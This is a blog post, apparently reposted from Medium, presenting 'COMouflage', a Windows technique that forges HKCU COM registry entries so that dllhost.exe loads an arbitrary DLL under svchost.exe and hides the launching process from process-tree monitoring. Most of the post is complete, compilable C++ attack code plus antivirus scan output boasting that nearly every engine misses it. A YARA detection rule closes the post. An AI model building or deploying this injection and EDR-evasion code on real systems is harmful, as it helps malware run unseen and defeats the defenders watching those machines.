# https://core-jmp.org/2026/04/comouflage-stealthy-dll-surrogate-injection-for-process-tree-evasion/

[Home](https://core-jmp.org/)/ [Bypassing](https://core-jmp.org/security/windows/bypassing/)

[Bypassing](https://core-jmp.org/security/windows/bypassing/) [COM](https://core-jmp.org/security/windows/com/) [cpp](https://core-jmp.org/security/cpp/) [EDR](https://core-jmp.org/security/edr/)

# COMouflage: Stealthy DLL Surrogate Injection for Process Tree Evasion

COMouflage is a stealthy Windows injection technique that abuses COM DLL Surrogates to execute malicious DLLs inside dllhost.exe, making svchost.exe appear as the parent process and hiding the attacker’s process from detection.

![](https://secure.gravatar.com/avatar/3dee7d2fb3c89c03da14239a3f304ccaad434e90c3125929b06a602b9c20e315?s=72&d=mm&r=g)**oxfemale** April 7, 202612 min read502 reads

Translate [Export PDF](https://core-jmp.org/wp-admin/admin-post.php?action=generate_pdf_sunarc&post_id=2391&post_to_pdf_exporter_nonce=62b6633a4f)
Copy link

![COMouflage: Stealthy DLL Surrogate Injection for Process Tree Evasion](https://core-jmp.org/wp-content/uploads/2026/04/%D0%A1%D0%BD%D0%B8%D0%BC%D0%BE%D0%BA-%D1%8D%D0%BA%D1%80%D0%B0%D0%BD%D0%B0-2026-04-07-%D0%B2-22.48.52.png)

[Original text](https://medium.com/@s12deff/comouflage-surrogate-injection-cfb93e15afcd) by [S12 – 0x12Dark Development](https://medium.com/@s12deff?source=post_page---byline--cfb93e15afcd---------------------------------------)

_The article introduces **COMouflage**, a stealthy Windows process-injection technique that abuses the legitimate **COM DLL Surrogate mechanism** to execute malicious code inside trusted system processes. Instead of directly injecting into a target process, the attacker registers a fake COM object in the Windows registry under **HKEY\_CURRENT\_USER**, which does not require administrator privileges. The configuration includes an AppID entry with the `DllSurrogate` value and a CLSID entry pointing to a malicious DLL. When the attacker calls `CoCreateInstance` with the `CLSCTX_LOCAL_SERVER` flag, the COM service launches **dllhost.exe** as a surrogate host and loads the attacker’s DLL into it automatically. Because the surrogate process is normally spawned by **svchost.exe**, the resulting process tree appears legitimate and hides the original malicious process. This technique provides multiple advantages for attackers, including **parent process masquerading, stealth execution, and reduced detection by EDR tools**, since the malicious code runs inside a trusted Windows component using legitimate system mechanisms rather than classic injection APIs._

copy

```
Attacker Process
        │
        │ Create COM Registry Keys (HKCU\AppID + CLSID)
        ▼
CoCreateInstance(CLSCTX_LOCAL_SERVER)
        │
        ▼
COM Service Control Manager
        │
        ▼
svchost.exe (COM+ Service)
        │
        ▼
dllhost.exe (DLL Surrogate)
        │
        ▼
Malicious DLL Loaded
        │
        ▼
Stealth Execution / EDR Evasion
```

What if you could inject malicious code into a trusted Windows process without ever touching it directly, without admin rights, and without triggering most EDR solutions?

That’s exactly what **COMouflage** achieves. By weaponizing a legitimate Windows mechanism called _DLL Surrogate_, an attacker can make malware run inside **dllhost.exe**, with **svchost.exe** appearing as its parent.

To any analyst glancing at the process tree, nothing looks out of the ordinary. This post breaks down exactly how this technique works, why it’s so stealthy, and how it’s implemented in C++

## Methodology

COM (Component Object Model) hijacking has long been documented as a persistence trick swap out a registry key, get your DLL loaded. But COMouflage takes things further. Rather than just persisting, it uses COM’s **DLL Surrogate** mechanism to achieve full **process injection with parent process masquerading**

When Windows launches a COM object configured as an out-of-process server, it spins up **dllhost.exe** automatically and the parent of that **dllhost.exe** is **svchost.exe**, not your malicious process. The initiating process disappears from the lineage entirely.

Before touching any code, let’s walk through the logical recipe.

To achieve surrogate-based DLL injection, we follow these steps:

### **Forge the Registry Identity**

First, we need to create a fake COM object identity in the Windows registry specifically inside **HKEY\_CURRENT\_USER** (HKCU), not **HKEY\_LOCAL\_MACHINE**.

This is critical because **HKCU** requires **no elevated privileges**. We write two registry paths: one for the **AppID** (which tells Windows _how_ to host the object) and one for the **CLSID** (which tells Windows _what_ the object is and where the DLL lives)

### **Set the DllSurrogate Trigger**

Inside the **AppID** key, we set a value called **DllSurrogate** to an **empty string**. This is the magic switch. An empty DllSurrogate value tells Windows: **_Use the default surrogate host_** which is **dllhost.exe**. Windows will automatically launch it and load our DLL inside it.

### **Set the DllSurrogate Trigger**

Under the **CLSID** key’s **InprocServer32** subkey, we write the full path to our malicious DLL. The **ThreadingModel** is set to **Apartment** to satisfy COM’s threading requirements and prevent instantiation failures

### **Point to the Payload DLL**

Under the **CLSID** key’s **InprocServer32** subkey, we write the full path to our malicious DLL. The **ThreadingModel** is set to **Apartment** to satisfy COM’s threading requirements and prevent instantiation failures

### **Trigger Instantiation via CoCreateInstance**

Finally, we call **CoCreateInstance** with the flag **CLSCTX\_LOCAL\_SERVER**. This flag is the detonator. It forces Windows to treat our COM object as an _out-of-process_ server, which causes the COM Service Control Manager to read our registry entries, find the **DllSurrogate** value, launch **dllhost.exe**, and load our DLL into it. Our job is done.

## Implementation

Now, let’s look at how to translate that logic into C++ code. I have broken down the most important parts.

### **Registry Helper Function**

copy

```
bool SetRegStr(HKEY root, const std::wstring& key,
               const std::wstring& name, const std::wstring& val) {
    HKEY h;
    if (RegCreateKeyExW(root, key.c_str(), 0, nullptr,
        REG_OPTION_NON_VOLATILE, KEY_WRITE, nullptr, &h, nullptr) != ERROR_SUCCESS)
        return false;

    if (RegSetValueExW(h,
        name.empty() ? nullptr : name.c_str(),
        0, REG_SZ,
        (const BYTE*)val.c_str(),
        DWORD((val.size() + 1) * sizeof(wchar_t))) != ERROR_SUCCESS)
    {
        RegCloseKey(h);
        return false;
    }
    RegCloseKey(h);
    return true;
}
```

This is the utility function that does all the registry writing. **RegCreateKeyExW** either creates a new key or opens an existing one, it’s non-destructive if the key already exists.

Notice **REG\_OPTION\_NON\_VOLATILE**: this makes the key persist across reboots. For a stealthier, memory-only variant, you could swap this for **REG\_OPTION\_VOLATILE**, which evaporates when the hive is unloaded.

### **Writing the AppID and CLSID Keys**

copy

```
static const wchar_t* CLSID_STR = L"{F00DBABA-2504-2025-2016-666699996666}";

// AppID key: tells Windows to use dllhost.exe as surrogate
std::wstring appidKey = LR"(Software\Classes\AppID\)" + std::wstring(CLSID_STR);
SetRegStr(HKEY_CURRENT_USER, appidKey, L"",             L"MyStealthObject");
SetRegStr(HKEY_CURRENT_USER, appidKey, L"DllSurrogate", L"");  // Empty = use dllhost.exe

// CLSID key: defines the COM object and points to the DLL
std::wstring clsidKey  = LR"(Software\Classes\CLSID\)" + std::wstring(CLSID_STR);
std::wstring inprocKey = clsidKey + LR"(\InprocServer32)";

SetRegStr(HKEY_CURRENT_USER, clsidKey,  L"",              L"MyStealthObject");
SetRegStr(HKEY_CURRENT_USER, clsidKey,  L"AppID",         CLSID_STR);
SetRegStr(HKEY_CURRENT_USER, inprocKey, L"",              L"C:\\Users\\sample.dll");
SetRegStr(HKEY_CURRENT_USER, inprocKey, L"ThreadingModel", L"Apartment");
```

This is where the COM identity is constructed. The **CLSID** is essentially a fake name tag for our object, a GUID we invented.

The **AppID** entry with **DllSurrogate = “”** is the key instruction to Windows. The **InprocServer32** entry is what tells **dllhost.exe** ( _which DLL)_ to load once it spawns. The path should point to a user-writable location to stay privilege-free

### **The Trigger CoCreateInstance**

copy

```
HRESULT hr = CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);

CLSID clsid;
CLSIDFromString(const_cast<LPWSTR>(CLSID_STR), &clsid);

IUnknown* p;
hr = CoCreateInstance(
    clsid,
    nullptr,
    CLSCTX_LOCAL_SERVER,  // <-- This is the detonator
    IID_IUnknown,
    (void**)&p
);
```

**CoInitializeEx** sets up the COM runtime for the current thread. Then **CLSIDFromString** converts our GUID string into the binary format COM needs internally

The crucial line is **CoCreateInstance** with **CLSCTX\_LOCAL\_SERVER**. Without this flag, COM would try to load the DLL in-process (directly into our own process) which is not what we want.

**CLSCTX\_LOCAL\_SERVER** forces COM to go _out-of-process_, which means the COM SCM kicks in, reads the registry, finds **DllSurrogate**, and spawns **dllhost.exe** to host the DLL. Our process triggered the injection but never directly touched dllhost.exe

### **The Resulting Process Tree**

copy

```
svchost.exe  (COM+ System Application)
└── dllhost.exe /Processid:{F00DBABA-...}
└── [sample.dll loaded and executing]
```

The attacker’s process is **nowhere in this tree**. From a process monitoring perspective, this looks like routine COM activity

## Code

Complete code:

copy

```
#include <windows.h>
#include <objbase.h>
#include <iostream>

// Custom CLSID for our malicious COM object
// This GUID will uniquely identify our COM object in the registry
static const wchar_t* CLSID_STR = L"{F00DBABA-2504-2025-2016-666699996666}";

//Helper function to write string values to Windows registry
bool SetRegStr(HKEY root, const std::wstring& key, const std::wstring& name, const std::wstring& val) {
    HKEY h;

    // Create or open the registry key with write permissions
    // REG_OPTION_VOLATILE means the key won't persist across reboots
    if (RegCreateKeyExW(root, key.c_str(), 0, nullptr,
        REG_OPTION_VOLATILE, KEY_WRITE, nullptr, &h, nullptr) != ERROR_SUCCESS) {
        return false;
    }

    // Write the string value to the registry
    if (RegSetValueExW(h,
        name.empty() ? nullptr : name.c_str(),
        0, REG_SZ,
        reinterpret_cast<const BYTE*>(val.c_str()),
        DWORD((val.size() + 1) * sizeof(wchar_t))) != ERROR_SUCCESS) {
        RegCloseKey(h);
        return false;
    }

    RegCloseKey(h);
    return true;
}

int wmain() {
    // STEP 1: Create AppID registry entry for DLL Surrogate configuration
    // This tells Windows to use dllhost.exe as a surrogate process
    std::wstring appidKey = LR"(Software\Classes\AppID\)" + std::wstring(CLSID_STR);

    // Set default value and empty DllSurrogate (triggers default dllhost.exe)
    if (!SetRegStr(HKEY_CURRENT_USER, appidKey, L"", L"MyStealthObject") ||
        !SetRegStr(HKEY_CURRENT_USER, appidKey, L"DllSurrogate", L"")) {
        std::wcerr << L"[!] AppID registry failed\n";
        return 1;
    }

    // STEP 2: Create CLSID registry entries to define our COM object
    // This maps our CLSID to the malicious DLL and links it to the AppID
    std::wstring clsidKey = LR"(Software\Classes\CLSID\)" + std::wstring(CLSID_STR);
    std::wstring inprocKey = clsidKey + LR"(\InprocServer32)";

    if (!SetRegStr(HKEY_CURRENT_USER, clsidKey, L"", L"MyStealthObject") ||           // Object name
        !SetRegStr(HKEY_CURRENT_USER, clsidKey, L"AppID", CLSID_STR) ||              // Link to AppID
        !SetRegStr(HKEY_CURRENT_USER, inprocKey, L"", L"C:\\Users\\Public\\DummyDLL.dll") ||   // Path to malicious DLL
        !SetRegStr(HKEY_CURRENT_USER, inprocKey, L"ThreadingModel", L"Apartment")) { // COM threading model
        std::wcerr << L"[!] CLSID registry failed\n";
        return 1;
    }

    std::wcout << L"[+] Registry for COM surrogates created\n";

    // STEP 3: Initialize COM subsystem and trigger the injection
    // Initialize COM library for apartment-threaded model
    HRESULT hr = CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);
    if (FAILED(hr)) {
        std::wcerr << L"[!] CoInitializeEx: 0x" << std::hex << hr << L"\n";
        return 1;
    }

    // Convert string CLSID to binary format
    CLSID clsid;
    hr = CLSIDFromString(const_cast<LPWSTR>(CLSID_STR), &clsid);
    if (FAILED(hr)) {
        std::wcerr << L"[!] Invalid CLSID\n";
        return 1;
    }

    // THE MAGIC HAPPENS HERE!
    // CLSCTX_LOCAL_SERVER forces Windows to:
    // 1. Look up our CLSID in the registry
    // 2. Find the DllSurrogate entry
    // 3. Launch dllhost.exe as a surrogate process
    // 4. Load our malicious DLL into dllhost.exe
    // 5. The parent process appears as svchost.exe
    IUnknown* p;
    hr = CoCreateInstance(clsid, nullptr,
        CLSCTX_LOCAL_SERVER,  // KEY PARAMETER: Forces out-of-process execution
        IID_IUnknown,
        (void**)&p);

    // Clean up COM subsystem
    CoUninitialize();

    // At this point, our DLL is running in dllhost.exe with svchost.exe as parent
    return 0;
}
```

## Proof of Concept

**Windows 11:**

If we try to run the code:

Press enter or click to view image in full size

![](https://core-jmp.org/wp-content/uploads/2026/04/%D0%A1%D0%BD%D0%B8%D0%BC%D0%BE%D0%BA-%D1%8D%D0%BA%D1%80%D0%B0%D0%BD%D0%B0-2026-04-07-%D0%B2-22.48.52.png)

The messagebox is the message loaded from the DLL

## Detection

Now it’s time to see if the defenses are detecting this as a malicious threat

### Kleenscan API

copy

```
[*] Antivirus Scan Results:

  - alyac                | Status: scanning   | Flag: Scanning results incomplete    | Updated: 2026-04-05
  - amiti                | Status: ok         | Flag: Undetected                     | Updated: 2026-04-05
  - arcabit              | Status: ok         | Flag: Undetected                     | Updated: 2026-04-05
  - avast                | Status: ok         | Flag: Undetected                     | Updated: 2026-04-05
  - avg                  | Status: ok         | Flag: Undetected                     | Updated: 2026-04-05
  - avira                | Status: scanning   | Flag: Scanning results incomplete    | Updated: 2026-04-05
  - bullguard            | Status: ok         | Flag: Undetected                     | Updated: 2026-04-05
  - clamav               | Status: ok         | Flag: Undetected                     | Updated: 2026-04-05
  - comodolinux          | Status: ok         | Flag: Undetected                     | Updated: 2026-04-05
  - crowdstrike          | Status: ok         | Flag: Undetected                     | Updated: 2026-04-05
  - drweb                | Status: ok         | Flag: Undetected                     | Updated: 2026-04-05
  - emsisoft             | Status: ok         | Flag: Undetected                     | Updated: 2026-04-05
  - escan                | Status: ok         | Flag: Undetected                     | Updated: 2026-04-05
  - fprot                | Status: ok         | Flag: Undetected                     | Updated: 2026-04-05
  - fsecure              | Status: ok         | Flag: Undetected                     | Updated: 2026-04-05
  - gdata                | Status: ok         | Flag: Undetected                     | Updated: 2026-04-05
  - ikarus               | Status: ok         | Flag: Trojan-Downloader.Win64.Agent  | Updated: 2026-04-05
  - immunet              | Status: ok         | Flag: Undetected                     | Updated: 2026-04-05
  - kaspersky            | Status: ok         | Flag: Undetected                     | Updated: 2026-04-05
  - maxsecure            | Status: ok         | Flag: Undetected                     | Updated: 2026-04-05
  - mcafee               | Status: ok         | Flag: Undetected                     | Updated: 2026-04-05
  - microsoftdefender    | Status: ok         | Flag: Undetected                     | Updated: 2026-04-05
  - nano                 | Status: ok         | Flag: Undetected                     | Updated: 2026-04-05
  - nod32                | Status: ok         | Flag: Undetected                     | Updated: 2026-04-05
  - norman               | Status: ok         | Flag: Undetected                     | Updated: 2026-04-05
  - secureageapex        | Status: ok         | Flag: Unknown                        | Updated: 2026-04-05
  - seqrite              | Status: ok         | Flag: Undetected                     | Updated: 2026-04-05
  - sophos               | Status: ok         | Flag: Undetected                     | Updated: 2026-04-05
  - threatdown           | Status: ok         | Flag: Undetected                     | Updated: 2026-04-05
  - trendmicro           | Status: ok         | Flag: Undetected                     | Updated: 2026-04-05
  - vba32                | Status: ok         | Flag: Undetected                     | Updated: 2026-04-05
  - virusfighter         | Status: ok         | Flag: Undetected                     | Updated: 2026-04-05
  - xvirus               | Status: ok         | Flag: Undetected                     | Updated: 2026-04-05
  - zillya               | Status: ok         | Flag: Undetected                     | Updated: 2026-04-05
  - zonealarm            | Status: ok         | Flag: Undetected                     | Updated: 2026-04-05
  - zoner                | Status: ok         | Flag: Undetected                     | Updated: 2026-04-05
```

### Litterbox

Static Analysis:

![](https://core-jmp.org/wp-content/uploads/2026/04/%D0%A1%D0%BD%D0%B8%D0%BC%D0%BE%D0%BA-%D1%8D%D0%BA%D1%80%D0%B0%D0%BD%D0%B0-2026-04-07-%D0%B2-22.49.48.png)

### ThreatCheck

copy

```
[+] No threats found!
```

### Windows Defender

Not detected

### Kaspersky Free AV

Not detected

### Bitdefender Free AV

Not detected

### YARA

Here a YARA rule to detect this technique:

copy

```
rule Win_T1546_015_COMouflage_Surrogate_Injection {
    meta:
        author = "0x12 Dark Development"
        description = "Detects COM Surrogate injection technique (COMouflage) which weaponizes DLL Surrogates for process injection and parent PID masquerading."
        technique = "T1546.015 (Component Object Model Hijacking)"
        context = "https://0x12darkdev.net"
        date = "2026-04-06"
        severity = "High"

    strings:
        // Registry paths and keys critical to the technique
        $reg_appid = "Software\\Classes\\AppID\\" wide ascii
        $reg_clsid = "Software\\Classes\\CLSID\\" wide ascii
        $reg_inproc = "\\InprocServer32" wide ascii
        $val_surrogate = "DllSurrogate" wide ascii
        $val_threading = "ThreadingModel" wide ascii

        // API imports typically used to implement this
        $api_reg_create = "RegCreateKeyEx"
        $api_reg_set = "RegSetValueEx"
        $api_cocreate = "CoCreateInstance"
        $api_clside_str = "CLSIDFromString"

        // Hex for CLSCTX_LOCAL_SERVER (0x4) often passed to CoCreateInstance
        // This is a more behavioral indicator if found in code logic
        $hex_local_server = { 04 00 00 00 }

    condition:
        uint16(0) == 0x5A4D and // PE File
        (
            // Check for the combination of registry manipulation and COM instantiation
            (all of ($reg_*)) and
            (all of ($val_*)) and
            (any of ($api_*)) and
            $hex_local_server
        ) or (
            // High confidence if it includes the specific logic for empty DllSurrogate strings
            $val_surrogate and $reg_appid and $api_reg_set
        )
}
```

## Conclusions

In conclusion, **COMouflage Surrogate Injection** represents a sophisticated evolution of traditional COM hijacking by weaponizing the built-in `DllSurrogate` mechanism to achieve stealthy process injection without requiring administrative privileges. By decoupling the malicious process from its lineage and masquerading under the trusted `svchost.exe` and `dllhost.exe` tree, this technique effectively bypasses standard behavioral heuristics and parent-child relationship monitoring used by many EDR solutions.

### Share this:

- [Share on Facebook (Opens in new window)Facebook](https://core-jmp.org/2026/04/comouflage-stealthy-dll-surrogate-injection-for-process-tree-evasion/?share=facebook&nb=1)
- [Share on X (Opens in new window)X](https://core-jmp.org/2026/04/comouflage-stealthy-dll-surrogate-injection-for-process-tree-evasion/?share=x&nb=1)

### Like this:

LikeLoading…

[#com-hijacking](https://core-jmp.org/security/com-hijacking/) [#defense-evasion](https://core-jmp.org/security/defense-evasion/) [#dll-surrogate](https://core-jmp.org/security/dll-surrogate/) [#dllhost-exe](https://core-jmp.org/security/dllhost-exe/) [#edr-bypass](https://core-jmp.org/security/edr-bypass/) [#malware-development](https://core-jmp.org/security/malware-development/) [#offensive-security](https://core-jmp.org/security/offensive-security/) [#process-injection](https://core-jmp.org/security/process-injection/) [#red-team-techniques](https://core-jmp.org/security/red-team-techniques/) [#svchost-exe](https://core-jmp.org/security/svchost-exe/) [#windows-internals](https://core-jmp.org/security/windows-internals/) [#windows-registry-abuse](https://core-jmp.org/security/windows-registry-abuse/)

![](https://secure.gravatar.com/avatar/3dee7d2fb3c89c03da14239a3f304ccaad434e90c3125929b06a602b9c20e315?s=92&d=mm&r=g)

**oxfemale** Vulnerability research, reverse engineering, and exploit development.

[← previous **BlueHammer: Exploiting Microsoft Defender Update Workflow to Leak SAM and Escalate to SYSTEM**](https://core-jmp.org/2026/04/bluehammer-exploiting-microsoft-defender-update-workflow-to-leak-sam-and-escalate-to-system/) [next → **Recovery Mode Breakdown: Turning macOS Recovery Safari into Root Persistence**](https://core-jmp.org/2026/04/recovery-mode-breakdown-turning-macos-recovery-safari-into-root-persistence/)

## 0x05 // Related reading

[![KernelCallbackTable Process Injection](https://core-jmp.org/wp-content/uploads/2026/07/%D0%A1%D0%BD%D0%B8%D0%BC%D0%BE%D0%BA-%D1%8D%D0%BA%D1%80%D0%B0%D0%BD%D0%B0-%E2%80%94-2026-07-22-%D0%B2-13.55.49-1024x787.png)Uncategorized323](https://core-jmp.org/2026/07/kernelcallbacktable-process-injection/)

[Uncategorized](https://core-jmp.org/security/uncategorized/)

### [KernelCallbackTable Process Injection](https://core-jmp.org/2026/07/kernelcallbacktable-process-injection/)

Deep dive into KernelCallbackTable process injection, a technique that abuses the PEB's callback table to intercept and redirect Windows message handling, achieving…

oxfemale·Jul 22·12 min·323

[![LACUNA Chain: Ghost Frames Defeat Every Layer of EDR Call-Stack Detection](https://core-jmp.org/wp-content/uploads/2026/06/01_lacuna_edr_coverage-1024x1024.png)EDR Evasion132](https://core-jmp.org/2026/06/lacuna-chain-ghost-frames-defeat-edr-call-stack-detection/)

[EDR Evasion](https://core-jmp.org/security/edr-evasion/) [Exploit Development](https://core-jmp.org/security/exploit-development/)

### [LACUNA Chain: Ghost Frames Defeat Every Layer of EDR Call-Stack Detection](https://core-jmp.org/2026/06/lacuna-chain-ghost-frames-defeat-edr-call-stack-detection/)

Mohamed Alzhrani's LACUNA Chain combines BYOUD-Gap, the ETW-Ti APC window, win32u's 1,242 NOP gaps, ntdll/kernelbase ghost functions, BYOUD-MF machine-frame RSP teleport, BYOUD-RT…

oxfemale·Jun 21·30 min·132

[![Red Team Tactics: Utilizing Syscalls in C# — Writing the Code (Walk-through of Jack Halon’s Direct-Syscall PoC)](https://core-jmp.org/wp-content/uploads/2026/06/3840px-C_Sharp_wordmark.svg_-1024x1024.png)Red Team Operations47](https://core-jmp.org/2026/06/red-team-tactics-utilizing-syscalls-in-csharp-writing-the-code/)

[Red Team Operations](https://core-jmp.org/security/red-team-operations/) [windows](https://core-jmp.org/security/windows/)

### [Red Team Tactics: Utilizing Syscalls in C\# — Writing the Code (Walk-through of Jack Halon’s Direct-Syscall PoC)](https://core-jmp.org/2026/06/red-team-tactics-utilizing-syscalls-in-csharp-writing-the-code/)

Walk-through of Jack Halon's "Utilizing Syscalls in C# — Part 2" post: building a direct-syscall NtCreateFile PoC in C# .NET 3.5, extracting…

oxfemale·Jun 3·11 min·47

// Discussion

![AI Engine Chatbot](https://core-jmp.org/wp-content/plugins/ai-engine/images/chat-traditional-1.svg)

AI:

Hi! How can I help you?

%d